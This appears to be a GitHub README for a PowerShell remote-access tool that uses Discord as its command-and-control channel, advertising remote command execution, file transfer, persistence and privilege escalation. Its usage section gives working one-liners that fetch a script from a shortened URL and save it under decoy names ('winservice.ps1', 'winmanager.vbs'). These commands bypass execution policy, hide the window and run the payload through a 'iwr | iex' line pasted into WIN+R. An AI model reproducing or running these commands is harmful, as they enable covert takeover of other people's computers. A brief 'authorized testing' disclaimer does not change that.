# pwshdc-c2
A PowerShell Discord bot for remote command execution, in development

**Disclaimer**: This project should be used for authorized testing and educational purposes only.

## Features
- **Multiple Connections at the same time**
- **Execute PowerShell commands remotely**
- **File upload/download**
- **Add/Remove Persistence**
- **Privilege escalation**

## Usage
In cmd or powershell
```powershell
.\pwshdc.ps1 -tk 'bot-token' 'channel-id-from-server'
```

Or in a multi-step process for WIN+R execution, don't forget to change 'YOUR-TOKEN' and 'CHANNEL-ID'

```powershell
powershell -NoP -Ep Bypass -Command "iwr -UseBasicParsing https://is.gd/zVzeNh -OutFile $env:TEMP\winservice.ps1; powershell -NoP -Ep Bypass -File $env:TEMP\winservice.ps1 -tk 'YOUR-TOKEN' -cid 'CHANNEL-ID'"
```

Temporary alternative for hidden shell window:

```powershell
$psScriptPath = Join-Path $env:TEMP 'winservice.ps1'; $vbsLauncherPath = Join-Path $env:TEMP 'winmanager.vbs'; $psScriptUrl = 'https://is.gd/zVzeNh'; $tkParam = 'YOUR-TOKEN'; $cidParam = 'CHANNEL-ID'; try { iwr -Uri $psScriptUrl -OutFile $psScriptPath -UseBasicParsing } catch { exit 1 }; $vbsCommand = "powershell.exe -NoP -Ep Bypass -File ""$($psScriptPath.Replace('""','""""'))"" -tk ""$tkParam"" -cid ""$cidParam"""; $vbsContent = "Set objShell = CreateObject(""WScript.Shell""): objShell.Run ""$($vbsCommand.Replace('""','""""'))"", 0, False: Set objShell = Nothing"; try { $vbsContent | Out-File -FilePath $vbsLauncherPath -Encoding ASCII -Force } catch { exit 1 }; Start-Process wscript.exe -ArgumentList """$vbsLauncherPath""" -NoNewWindow;
```

Put the one of the Scripts from above in (https://raw-paste.vercel.app/), copy raw file link. Then paste the link into https://is.gd/ to make it shorter.

Then put this into WIN+R: 
```powershell
powershell -nop -ep bypass -W H -c "iwr https://YOUR-SHORTEN-LINK/ | iex"
```
